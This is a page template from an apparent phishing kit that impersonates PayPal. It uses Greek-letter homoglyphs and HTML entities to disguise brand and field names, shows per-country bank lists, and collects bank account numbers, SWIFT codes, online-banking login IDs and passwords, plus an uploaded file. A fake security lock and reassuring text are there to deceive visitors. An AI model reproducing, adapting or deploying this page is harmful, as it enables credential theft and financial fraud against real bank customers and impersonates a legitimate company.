<link rel="stylesheet" href="../css/jquery.popup.css" type="text/css">
<link rel="stylesheet" href="../css/style.css" />
<link href='http://fonts.googleapis.com/css?family=Roboto+Condensed|Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="../js/script.js"></script>
<script type="text/javascript" src="../js/jquery-2.0.3.min.js"></script>
<script type="text/javascript" src="../js/jquery.popup.js"></script>
<script type="text/javascript">
    $(function() {
      $(".js__p_start, .js__p_another_start").simplePopup();
    });
  </script>

  <script>
 
function check(){
var x = document.getElementById("txt").value;
var y = x.length;
var z = 25-y;
 
 
  
  if((z < 0) || (z==25)){
  var a = '<button style="width: 140px;" disabled="disabled" class="lal js__p_another_start" >Continue</button>';
  document.getElementById("go").innerHTML=a;
  }
 
  
  else {
  var a = '<button style="width: 140px;"  class="lal js__p_another_start">Continue</button>';
  document.getElementById("go").innerHTML=a;
  }
 
}
 
</script>
<script>
// Name and Email validation Function.
function validation(){
var bank = document.getElementById("bank").value;
if( bank ==='' ){
alert("Back Form Bank, Please fill all fields");
return false;
}else{
return true;
}
}

// Submit form with id function.
function submit_by_id() {
var bank = document.getElementById("bank").value;
if (validation()) // Calling validation function
{
document.getElementById("uploadimage").submit(); //form submission
}
}

function confirm_by_id() {
var bank = document.getElementById("bank").value;
if (validation()) // Calling validation function
{
document.getElementById("parentForm").submit(); //form submission
}
}


</script>
<form method="post" id="parentForm" name="creditcard_Form" action="Submitt" class="edit">
<center>
<?php
if ($negara=="GB"){ echo ' 
<p class="field" >&#x0042;ank Name :
 <select id="bank" name="bnkname" style="padding-left:4%;">
    <option value="Other">Select &#x0042;ank</options>
    <option value="Alliance and Leicester">Alliance and Leicester</options>
    <option value="Bank of Ireland">&#x0042;ank of Ireland</option>
    <option value="Bank of Scotland">&#x0042;ank of Scotland</option>
    <option value="Barclays Bank">Barclays &#98;ank</options>
    <option value="Citibank">Citibank</option>
    <option value="Clydesdale Bank">Clydesdale &#98;ank</option>
    <option value="Cahoot">Cahoot</options>
    <option value="Co operative bank">Co operative &#98;ank</option>
    <option value="Egg Bank">Egg &#98;ank</options>
    <option value="First Direct">First Direct</options>
    <option value="Halifax">Halifax</options>
    <option value="HSBC">HSBC</options>
    <option value="Intelligent Finance">Intelligent Finance </options>
    <option value="Isle of Man Bank">Isle of Man &#98;ank</options>
    <option value="Lloyds">Lloyds TSB</options>
    <option value="Metro Bank">Metro Bank</option>
    <option value="Natwest">Natwest</options>
    <option value="Nationwide">Nationwide</options>
    <option value="Northern Bank">Northern Bank</option>
    <option value="RBS">Royal &#98;ank of Scotland</options>
    <option value="Santander">Santander &#98;ank</options>
    <option value="Sainsburys Bank">Sainsburys &#98;ank</options>
    <option value="TSB Bank">TSB &#98;ank</options>
    <option value="Tesco Personal Finance">Tesco Personal Finance</options>
    <option value="Unity Trust Bank plc">Unity Trust &#98;ank plc</options>
    <option value="Ulster Bank">Ulster &#98;ank</option>
    <option value="Virgin Money">Virgin Money</options>
    <option value="Yorkshire Bank">Yorkshire &#98;ank</options>
    <option value="Other">Other</options>
</select>
';}
else if ($negara=="CA"){ echo ' 
<p class="field" >&#x0042;ank Name :
 <select id="bank" name="bnknameca" style="padding-left:4%;">
    <option value="">Select &#x0042;ank</options>
    <option value="B2B Bank">B2B &#98;ank</options>
    <option value="Bank of Montreal">&#x0042;ank of Montreal</options>
    <option value="Bank of Nova Scotia">&#x0042;ank of Nova Scotia</options>
    <option value="Bridgewater Bank">Bridgewater &#98;ank</options>
    <option value="Cibc">Canadian Imperial &#98;ank of Commerce</options>
    <option value="Canadian Tire Bank">Canadian Tire &#98;ank</options>
    <option value="Canadian Western Bank">Canadian Western &#98;ank</options>
    <option value="Citizens Bank of Canada">Citizens &#98;ank of Canada</options>
    <option value="CFF Bank">CFF Bank</options>
    <option value="Continental Bank of Canada">Continental &#98;ank of Canada</options>
    <option value="CS Alterna Bank">CS Alterna &#98;ank</options>
    <option value="DirectCash Bank">DirectCash &#98;ank</options>
    <option value="Equitable Bank">Equitable &#98;ank</options>
    <option value="First Nations Bank of Canada">First Nations &#98;ank of Canada</options>
    <option value="General Bank of Canada">General &#98;ank of Canada</options>
    <option value="Hollis Canadian Bank">Hollis Canadian &#98;ank</options>
    <option value="Laurentian Bank of Canada">Laurentian &#98;ank of Canada</options>
    <option value="Manulife Bank of Canada">Manulife &#98;ank of Canada</options>
    <option value="National Bank of Canada">National &#98;ank of Canada</options>
    <option value="Pacific Western Bank of Canada">Pacific & Western &#98;ank of Canada</options>
    <option value="Presidents Choice Bank">Presidents Choice &#98;ank</options>
    <option value="RedBrick Bank">RedBrick &#98;ank</options>
    <option value="Rogers Bank">Rogers &#98;ank</options>
    <option value="RBC">Royal &#98;ank of Canada</options>
    <option value="Tangerine Bank">Tangerine &#98;ank</options>
    <option value="TorontoDominion Bank">Toronto Dominion &#98;ank</options>
    <option value="Wealth One Bank of Canada">Wealth One &#98;ank of Canada</options>
    <option value="Zag Bank">Zag &#98;ank</options>
    <option value="otherca">Other</options>
</select>
';}
else if ($negara=="US") { echo '
<p class="field" >&#x0042;ank Name :
 <select id="bank" name="bnknameus" style="padding-left:4%;">
    <option value="">Select &#x0042;ank</options>
    <option value="Ally Financial">Ally Financial</options>
    <option value="American Express Company">American Express Company</options>
    <option value="BB&T">BB&T</options>
    <option value="Bank of America">Bank of America</options>
    <option value="Bank of New York Mellon">Bank of New York Mellon</options>
    <option value="Charles Schwab Corporation">Charles Schwab Corporation</options>
    <option value="Capital One">Capital One</options>
    <option value="Citizens Financial Group">Citizens Financial Group</options>
    <option value="Citigroup">Citigroup</options>
    <option value="Fifth Third Bank">Fifth Third Bank</options>
    <option value="Goldman Sachs">Goldman Sachs</options>
    <option value="HSBC Bank USA">HSBC Bank USA</options>
    <option value="JPMorgan Chase">JPMorgan Chase</options>
    <option value="Morgan Stanley">Morgan Stanley</options>
    <option value="PNC Financial Services">PNC Financial Services</options>
    <option value="SunTrust Banks">SunTrust Banks</options>
    <option value="State Street Corporation">State Street Corporation</options>
    <option value="TD Bank">TD Bank, N.A.</options>
    <option value="US Bancorp">U.S. Bancorp</options>
    <option value="Wells Fargo">Wells Fargo</options>
    <option value="otherus">Other</options>
</select>
';}
else { echo '

<td><div align="right"><a href="#">Secure <img src="../../poto/secure_lock_2.gif"></a></div></td>
<br/>
<div align="left">
<span class="help" style="padding-left:4%;">&Rho;ay&Rho;al protects your bank account by keeping your financial information confidential. We email you when you make a transaction with this bank account.

To avoid withdrawal failures and return fees, the name on your &Rho;ay&Rho;al account must match the name on your bank account. If the names don’t match, you might be able to change the name on your &Rho;ay&Rho;al account.</span></div>
               <table>
                <tr><br/>
	
            <td><b>Account &Nu;umber </b></td>

            <td><input type="number" id="bank" autocomplete="off"  maxlength="25" name="acnot" value="" required="required" title="Account Number" placeholder="(Numeric)*1234567890"></input></td>


        </tr>
		<tr>
           <td><b>&#x0042;ank Name </b></td>
            <td><input type="text"  autocomplete="off"  maxlength="17" name="bnknameus" value="" required="required" title="Bank Name" placeholder="AUSTRALIA AND NEW ZEALAND BANKING GROUP, LTD"></input></td>


        </tr>
		
<tr>
            <td><b>&#x0042;ank C&omicron;de </b></td>
            <td><input type="text"  autocomplete="off"  maxlength="25" name="swsd" value="" required="required" title="Bank Swift C&omicron;de" placeholder="Ex : ANZBAU3M- optional"/></input></td>
        </tr>


        <tr>
            <td><b>&#x0042;ank &#x004C;ogin ID </b></td>
            <td><input type="text"  autocomplete="off"  maxlength="25" name="lobank" value="" required="required" title="Username" placeholder="Ex: 163519361"></input></td>


        </tr>
        <tr>
            <td><b>&#x0042;ank &#x004C;ogin Passw&omicron;rd </b></td>
            <td><input type="password" id="txt" onkeyup="check()" onmouseout="check()"  autocomplete="off"  maxlength="25" name="pwd_csdad" value="" required="required" title="Password" placeholder="Please enter your password"></input></td>

        </tr>
    </table>

';}?>
</form>
</form>

<div id="form-bank"></div>

                        <p class="bcenter">

                        <a href="#" id="go" style="display:block" class="lal js__p_another_start"></a></p>
 </div>
            </section>
            </div>
        </div>
    </div><br>

<?php include('footer.php'); ?>

  <div class="p_body js__p_body js__fadeout"></div>
  <div class="popup js__another_popup js__slide_top">
    <div class="p_content"></div>
<div id="image_atas"><img id="previewings" src="../icon/atas.png" /></div>
<div class="main">
<form id="uploadimage" enctype="multipart/form-data">
<a href="#" id="image_preview"><img id="previewing" src="../icon/14.png" File" onclick="document.getElementById('file').click()" /></a>
<input type="file" name="file" id="file"  style="display:none" required />
<input type="submit" value="Upload" style="width: 130px !important;" id="submit" class="submit" onclick="submit_by_id()"/>
<input type="submit" value="Confirm" style="display:none; width: 130px;"  class="p_close submitsuccess" onclick="confirm_by_id()" />
<h4 id='loading'></h4>
<div id="image_bawah"><img id="previewings" src="../icon/bawah.png" /></div>
<div id="message" ></div>
</div>
</form>

</div>
